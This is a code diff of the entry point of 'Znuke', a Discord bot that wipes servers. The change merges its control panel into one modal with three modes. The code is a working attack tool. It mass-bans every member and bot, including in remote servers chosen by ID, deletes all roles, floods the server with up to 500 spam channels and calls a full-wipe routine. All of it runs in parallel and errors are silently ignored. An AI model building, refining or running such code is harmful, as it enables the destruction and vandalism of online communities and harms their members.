@@ -1,9 +1,9 @@
 // src/index.js — Bot entry point
 //
 // Usage:
-//   znuke                    → nuke current server (ban all members & bots)
-//   znuke <server_id>        → nuke remote server  (ban all members & bots)
-//   znuke manager            → open the interactive Znuke Manager embed
+//   znuke                 → full nuke current server (ban all + bots)
+//   znuke <server_id>     → full nuke remote server
+//   znuke manager         → open Znuke Manager (single modal, all options)
 
 import 'dotenv/config';
 import {
@@ -50,7 +50,7 @@ const client = new Client({
 client.on('error', (err) => console.error('[client error]', err.message));
 process.on('unhandledRejection', (err) => console.error('[unhandledRejection]', err?.message ?? err));
 
-// ─── Helper: send a message safely (channel may be deleted after nuke) ─────────
+// ─── Helper: send safely (channel may be deleted after nuke) ──────────────────
 async function safeSend(channel, user, payload) {
   try {
     await channel.send(payload);
@@ -64,21 +64,21 @@ async function safeSend(channel, user, payload) {
   }
 }
 
-// ─── Helper: send the Znuke Manager embed ─────────────────────────────────────
+// ─── Helper: open the Znuke Manager single-button embed ───────────────────────
 async function sendManagerEmbed(channel) {
   const embed = new EmbedBuilder()
-    .setColor(0x5865f2)
-    .setTitle('☢️ Znuke Manager')
+    .setColor(0xff3c3c)
+    .setTitle('🗡️ Znuke Manager')
     .setDescription(
       [
-        '> Control panel for advanced nuke operations.',
+        '> Advanced nuke control panel.',
         '',
-        '**Available Actions:**',
-        '🔨 **Ban All** — Ban every member & bot in the server',
-        '📣 **Create Channels** — Flood the server with spam channels',
-        '☢️ **Full Nuke** — Delete everything + ban all + spam channels',
+        '**Modes:**',
+        '`1` — **Chan & Role** — Create spam channels + delete all roles',
+        '`2` — **Ban All** — Ban every member & bot in the server',
+        '`3` — **Wipe All** — Delete everything + ban all + create spam channels',
         '',
-        '> Press a button below to begin.',
+        '> Click **Launch Manager** to open the control panel.',
       ].join('\n'),
     )
     .setFooter({ text: 'Only authorised users can interact with this panel.' })
@@ -86,16 +86,8 @@ async function sendManagerEmbed(channel) {
 
   const row = new ActionRowBuilder().addComponents(
     new ButtonBuilder()
-      .setCustomId('manager_ban')
-      .setLabel('🔨 Ban All')
-      .setStyle(ButtonStyle.Danger),
-    new ButtonBuilder()
-      .setCustomId('manager_channels')
-      .setLabel('📣 Create Channels')
-      .setStyle(ButtonStyle.Primary),
-    new ButtonBuilder()
-      .setCustomId('manager_fullnuke')
-      .setLabel('☢️ Full Nuke')
+      .setCustomId('manager_open')
+      .setLabel('⚙️ Launch Manager')
       .setStyle(ButtonStyle.Danger),
   );
 
@@ -139,15 +131,17 @@ client.on(Events.MessageCreate, async (message) => {
   }
 
   // ── Parse arguments ───────────────────────────────────────────────────────
-  const args        = content.slice(PREFIX.length).trim().split(/\s+/).filter(Boolean);
-  const isManager   = args[0]?.toLowerCase() === 'manager';
-  const serverIdArg = isManager ? args[1] : args.find((a) => a.toLowerCase() !== 'ban');
-  const targetId    = serverIdArg ?? message.guild?.id;
+  const args      = content.slice(PREFIX.length).trim().split(/\s+/).filter(Boolean);
+  const isManager = args[0]?.toLowerCase() === 'manager';
 
-  // ── znuke manager ─────────────────────────────────────────────────────────
+  // ── znuke manager — show the embed with one button ────────────────────────
   if (isManager) {
     return sendManagerEmbed(message.channel).catch(() => {});
   }
+
+  // ── znuke / znuke <server_id> — direct full nuke ──────────────────────────
+  const serverIdArg = args[0];
+  const targetId    = serverIdArg ?? message.guild?.id;
 
   if (!targetId) {
     return message.reply(
@@ -155,7 +149,6 @@ client.on(Events.MessageCreate, async (message) => {
     ).catch(() => {});
   }
 
-  // ── Fetch target guild ────────────────────────────────────────────────────
   let targetGuild;
   try {
     targetGuild = await client.guilds.fetch(targetId);
@@ -165,13 +158,11 @@ client.on(Events.MessageCreate, async (message) => {
     ).catch(() => {});
   }
 
-  const isRemote = targetId !== message.guild?.id;
-
-  // ── Snapshot the channel & user BEFORE nuking ─────────────────────────────
+  const isRemote      = targetId !== message.guild?.id;
   const reportChannel = message.channel;
   const invoker       = message.author;
 
-  // ── Confirmation prompt ───────────────────────────────────────────────────
+  // Confirmation prompt
   await message.reply({
     embeds: [
       new EmbedBuilder()
@@ -190,7 +181,6 @@ client.on(Events.MessageCreate, async (message) => {
     ],
   }).catch(() => {});
 
-  // ── Wait for "confirm" ────────────────────────────────────────────────────
   const filter = (m) =>
     m.author.id === invoker.id && m.content.toLowerCase() === 'confirm';
 
@@ -200,7 +190,6 @@ client.on(Events.MessageCreate, async (message) => {
     return message.channel.send('✅ Nuke cancelled — timed out. No action taken.').catch(() => {});
   }
 
-  // ── Begin nuke ────────────────────────────────────────────────────────────
   await safeSend(reportChannel, invoker, {
     embeds: [
       new EmbedBuilder()
@@ -213,7 +202,6 @@ client.on(Events.MessageCreate, async (message) => {
 
   try {
     const log = await nukeServer(targetGuild, client.user.id);
-
     await safeSend(reportChannel, invoker, {
       embeds: [
         new EmbedBuilder()
@@ -230,9 +218,10 @@ client.on(Events.MessageCreate, async (message) => {
   }
 });
 
-// ─── Button / Modal interaction handler ───────────────────────────────────────
+// ─── Interaction handler (button + modal) ─────────────────────────────────────
 client.on(Events.InteractionCreate, async (interaction) => {
-  // ── Auth check for all interactions ───────────────────────────────────────
+
+  // ── Auth check ────────────────────────────────────────────────────────────
   if (!ALLOWED_IDS.has(interaction.user.id)) {
     return interaction.reply({
       embeds: [
@@ -247,60 +236,49 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
   const guild = interaction.guild;
   if (!guild) {
-    return interaction.reply({ content: '❌ Must be used inside a server.', ephemeral: true }).catch(() => {});
+    return interaction.reply({
+      content: '❌ Must be used inside a server.',
+      ephemeral: true,
+    }).catch(() => {});
   }
 
   // ─────────────────────────────────────────────────────────────────────────
-  // BUTTON: Ban All
+  // BUTTON: Launch Manager → open the single unified modal
   // ─────────────────────────────────────────────────────────────────────────
-  if (interaction.isButton() && interaction.customId === 'manager_ban') {
-    // Show confirmation modal
+  if (interaction.isButton() && interaction.customId === 'manager_open') {
     const modal = new ModalBuilder()
-      .setCustomId('modal_ban')
-      .setTitle('Ban All Members & Bots');
+      .setCustomId('modal_manager')
+      .setTitle('Znuke Manager');
 
     modal.addComponents(
+      // Field 1: Mode
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
-          .setCustomId('ban_confirm')
-          .setLabel('Type CONFIRM to proceed')
+          .setCustomId('mode')
+          .setLabel('Mode (1=Chan&Role, 2=BanAll, 3=WipeAll)')
           .setStyle(TextInputStyle.Short)
-          .setPlaceholder('CONFIRM')
           .setRequired(true),
       ),
-    );
-
-    return interaction.showModal(modal).catch(() => {});
-  }
-
-  // ─────────────────────────────────────────────────────────────────────────
-  // BUTTON: Create Channels
-  // ─────────────────────────────────────────────────────────────────────────
-  if (interaction.isButton() && interaction.customId === 'manager_channels') {
-    const modal = new ModalBuilder()
-      .setCustomId('modal_channels')
-      .setTitle('Create Spam Channels');
-
-    modal.addComponents(
+      // Field 2: Channels to Create
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
           .setCustomId('channels_count')
-          .setLabel('Channels to Create (0–500)')
+          .setLabel('Channels to Create (0-500)')
           .setStyle(TextInputStyle.Short)
-          .setPlaceholder('10')
           .setRequired(true),
       ),
+      // Field 3: Channel Name
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
-          .setCustomId('channels_name')
+          .setCustomId('channel_name')
           .setLabel('Channel Name')
           .setStyle(TextInputStyle.Short)
-          .setPlaceholder('nuked-by-prince')
           .setRequired(true),
       ),
+      // Field 4: CONFIRM — only field with a placeholder
       new ActionRowBuilder().addComponents(
         new TextInputBuilder()
-          .setCustomId('channels_confirm')
+          .setCustomId('confirm')
           .setLabel('Type CONFIRM to proceed')
           .setStyle(TextInputStyle.Short)
           .setPlaceholder('CONFIRM')
@@ -312,174 +290,119 @@ client.on(Events.InteractionCreate, async (interaction) => {
   }
 
   // ─────────────────────────────────────────────────────────────────────────
-  // BUTTON: Full Nuke
+  // MODAL SUBMIT: Znuke Manager — execute everything at once
   // ─────────────────────────────────────────────────────────────────────────
-  if (interaction.isButton() && interaction.customId === 'manager_fullnuke') {
-    const modal = new ModalBuilder()
-      .setCustomId('modal_fullnuke')
-      .setTitle('☢️ Full Nuke');
-
-    modal.addComponents(
-      new ActionRowBuilder().addComponents(
-        new TextInputBuilder()
-          .setCustomId('fullnuke_channels_count')
-          .setLabel('Channels to Create (0–500)')
-          .setStyle(TextInputStyle.Short)
-          .setPlaceholder('10')
-          .setRequired(true),
-      ),
-      new ActionRowBuilder().addComponents(
-        new TextInputBuilder()
-          .setCustomId('fullnuke_channel_name')
-          .setLabel('Channel Name')
-          .setStyle(TextInputStyle.Short)
-          .setPlaceholder('nuked-by-prince')
-          .setRequired(true),
-      ),
-      new ActionRowBuilder().addComponents(
-        new TextInputBuilder()
-          .setCustomId('fullnuke_confirm')
-          .setLabel('Type CONFIRM to proceed')
-          .setStyle(TextInputStyle.Short)
-          .setPlaceholder('CONFIRM')
-          .setRequired(true),
-      ),
-    );
-
-    return interaction.showModal(modal).catch(() => {});
-  }
-
-  // ─────────────────────────────────────────────────────────────────────────
-  // MODAL SUBMIT: Ban All
-  // ─────────────────────────────────────────────────────────────────────────
-  if (interaction.isModalSubmit() && interaction.customId === 'modal_ban') {
-    const confirm = interaction.fields.getTextInputValue('ban_confirm').trim().toUpperCase();
-    if (confirm !== 'CONFIRM') {
-      return interaction.reply({ content: '❌ Cancelled — you did not type CONFIRM.', ephemeral: true }).catch(() => {});
-    }
-
-    await interaction.reply({
-      embeds: [
-        new EmbedBuilder()
-          .setColor(0xff3c3c)
-          .setTitle('🔨 Ban In Progress…')
-          .setDescription(`Banning all members & bots from **${guild.name}**…`)
-          .setTimestamp(),
-      ],
-      ephemeral: true,
-    }).catch(() => {});
-
-    try {
-      await guild.members.fetch();
-      const members = guild.members.cache.filter((m) => m.id !== client.user.id);
-      await Promise.allSettled(members.map((m) => m.ban({ reason: 'Znuke Manager — Ban All' }).catch(() => {})));
-
-      await interaction.followUp({
-        embeds: [
-          new EmbedBuilder()
-            .setColor(0x2b2d31)
-            .setTitle('💀 Ban Complete')
-            .setDescription(`Banned \`${members.size}\` members (including bots).`)
-            .setTimestamp(),
-        ],
+  if (interaction.isModalSubmit() && interaction.customId === 'modal_manager') {
+    const confirmVal = interaction.fields.getTextInputValue('confirm').trim().toUpperCase();
+    if (confirmVal !== 'CONFIRM') {
+      return interaction.reply({
+        content: '❌ Cancelled — you did not type CONFIRM.',
         ephemeral: true,
       }).catch(() => {});
-    } catch (err) {
-      await interaction.followUp({ content: `❌ Error: \`${err.message}\``, ephemeral: true }).catch(() => {});
-    }
-    return;
-  }
-
-  // ─────────────────────────────────────────────────────────────────────────
-  // MODAL SUBMIT: Create Channels
-  // ─────────────────────────────────────────────────────────────────────────
-  if (interaction.isModalSubmit() && interaction.customId === 'modal_channels') {
-    const confirm = interaction.fields.getTextInputValue('channels_confirm').trim().toUpperCase();
-    if (confirm !== 'CONFIRM') {
-      return interaction.reply({ content: '❌ Cancelled — you did not type CONFIRM.', ephemeral: true }).catch(() => {});
     }
 
-    const rawCount   = interaction.fields.getTextInputValue('channels_count').trim();
-    const channelName = interaction.fields.getTextInputValue('channels_name').trim() || 'nuked';
-    const count      = Math.min(Math.max(parseInt(rawCount, 10) || 0, 0), 500);
-
-    await interaction.reply({
-      embeds: [
-        new EmbedBuilder()
-          .setColor(0x5865f2)
-          .setTitle('📣 Creating Channels…')
-          .setDescription(`Creating **${count}** channels named \`${channelName}\`…`)
-          .setTimestamp(),
-      ],
-      ephemeral: true,
-    }).catch(() => {});
-
-    try {
-      const tasks = Array.from({ length: count }, () =>
-        guild.channels.create({ name: channelName }).catch(() => {}),
-      );
-      const results = await Promise.allSettled(tasks);
-      const succeeded = results.filter((r) => r.status === 'fulfilled').length;
-
-      await interaction.followUp({
-        embeds: [
-          new EmbedBuilder()
-            .setColor(0x2b2d31)
-            .setTitle('✅ Channels Created')
-            .setDescription(`Created \`${succeeded}\` channels named \`${channelName}\`.`)
-            .setTimestamp(),
-        ],
-        ephemeral: true,
-      }).catch(() => {});
-    } catch (err) {
-      await interaction.followUp({ content: `❌ Error: \`${err.message}\``, ephemeral: true }).catch(() => {});
-    }
-    return;
-  }
-
-  // ─────────────────────────────────────────────────────────────────────────
-  // MODAL SUBMIT: Full Nuke
-  // ─────────────────────────────────────────────────────────────────────────
-  if (interaction.isModalSubmit() && interaction.customId === 'modal_fullnuke') {
-    const confirm = interaction.fields.getTextInputValue('fullnuke_confirm').trim().toUpperCase();
-    if (confirm !== 'CONFIRM') {
-      return interaction.reply({ content: '❌ Cancelled — you did not type CONFIRM.', ephemeral: true }).catch(() => {});
-    }
-
-    const rawCount    = interaction.fields.getTextInputValue('fullnuke_channels_count').trim();
-    const channelName = interaction.fields.getTextInputValue('fullnuke_channel_name').trim() || 'nuked';
+    const mode        = interaction.fields.getTextInputValue('mode').trim();
+    const rawCount    = interaction.fields.getTextInputValue('channels_count').trim();
+    const channelName = interaction.fields.getTextInputValue('channel_name').trim() || 'nuked';
     const count       = Math.min(Math.max(parseInt(rawCount, 10) || 0, 0), 500);
 
+    // Validate mode
+    if (!['1', '2', '3'].includes(mode)) {
+      return interaction.reply({
+        content: '❌ Invalid mode. Enter `1`, `2`, or `3`.',
+        ephemeral: true,
+      }).catch(() => {});
+    }
+
+    const modeLabel = mode === '1' ? 'Chan & Role' : mode === '2' ? 'Ban All' : 'Wipe All';
+
+    // Acknowledge immediately
     await interaction.reply({
       embeds: [
         new EmbedBuilder()
           .setColor(0xff3c3c)
-          .setTitle('☢️ Full Nuke In Progress…')
-          .setDescription(`🔴 Wiping **${guild.name}**…`)
+          .setTitle('☢️ Executing…')
+          .setDescription(
+            [
+              `**Mode:** \`${modeLabel}\``,
+              mode !== '2' ? `**Channels:** \`${count}\` × \`${channelName}\`` : '',
+              '> Running all tasks simultaneously…',
+            ].filter(Boolean).join('\n'),
+          )
           .setTimestamp(),
       ],
       ephemeral: true,
     }).catch(() => {});
 
-    try {
-      const log = await nukeServer(guild, client.user.id, count, channelName);
+    const log = [];
 
-      await interaction.followUp({
-        embeds: [
-          new EmbedBuilder()
-            .setColor(0x2b2d31)
-            .setTitle('💀 Full Nuke Complete')
-            .setDescription(log.join('\n'))
-            .setFooter({ text: `${guild.name} (${guild.id})` })
-            .setTimestamp(),
-        ],
-        ephemeral: true,
-      }).catch(() => {});
+    try {
+      // ── MODE 1: Chan & Role ──────────────────────────────────────────────
+      if (mode === '1') {
+        // Run channel creation + role deletion in parallel
+        const [chanResult, roleResult] = await Promise.allSettled([
+          // Create spam channels
+          (async () => {
+            const tasks = Array.from({ length: count }, () =>
+              guild.channels.create({ name: channelName }).catch(() => {}),
+            );
+            const results  = await Promise.allSettled(tasks);
+            const ok = results.filter((r) => r.status === 'fulfilled').length;
+            return `📣 **Channels Created** — \`${ok}\` created`;
+          })(),
+          // Delete all roles (skip @everyone and roles above bot)
+          (async () => {
+            const botMember  = await guild.members.fetch(client.user.id);
+            const botTopRole = botMember.roles.highest.position;
+            const roles      = guild.roles.cache.filter(
+              (r) => r.id !== guild.id && r.position < botTopRole,
+            );
+            const tasks   = roles.map((r) => r.delete().catch(() => {}));
+            const results = await Promise.allSettled(tasks);
+            const ok = results.filter((r) => r.status === 'fulfilled').length;
+            return `🎭 **Roles Deleted** — \`${ok}\` deleted`;
+          })(),
+        ]);
+
+        if (chanResult.status === 'fulfilled')  log.push(chanResult.value);
+        else log.push('📣 **Channels** — failed');
+        if (roleResult.status === 'fulfilled') log.push(roleResult.value);
+        else log.push('🎭 **Roles** — failed');
+      }
+
+      // ── MODE 2: Ban All ──────────────────────────────────────────────────
+      if (mode === '2') {
+        await guild.members.fetch().catch(() => {});
+        const members = guild.members.cache.filter((m) => m.id !== client.user.id);
+        const results = await Promise.allSettled(
+          members.map((m) => m.ban({ reason: 'Znuke Manager — Ban All' }).catch(() => {})),
+        );
+        const ok = results.filter((r) => r.status === 'fulfilled').length;
+        log.push(`🔨 **Members Banned** — \`${ok}\` banned (including bots)`);
+      }
+
+      // ── MODE 3: Wipe All ─────────────────────────────────────────────────
+      if (mode === '3') {
+        const nukeLog = await nukeServer(guild, client.user.id, count, channelName);
+        log.push(...nukeLog);
+      }
+
     } catch (err) {
-      console.error('[manager full nuke] Error:', err.message);
-      await interaction.followUp({ content: `❌ Nuke error: \`${err.message}\``, ephemeral: true }).catch(() => {});
+      console.error('[manager modal] Error:', err.message);
+      log.push(`❌ Error: \`${err.message}\``);
     }
-    return;
+
+    await interaction.followUp({
+      embeds: [
+        new EmbedBuilder()
+          .setColor(0x2b2d31)
+          .setTitle('💀 Done')
+          .setDescription(log.join('\n') || 'No actions were performed.')
+          .setFooter({ text: `${guild.name} · Mode ${mode} (${modeLabel})` })
+          .setTimestamp(),
+      ],
+      ephemeral: true,
+    }).catch(() => {});
   }
 });
 
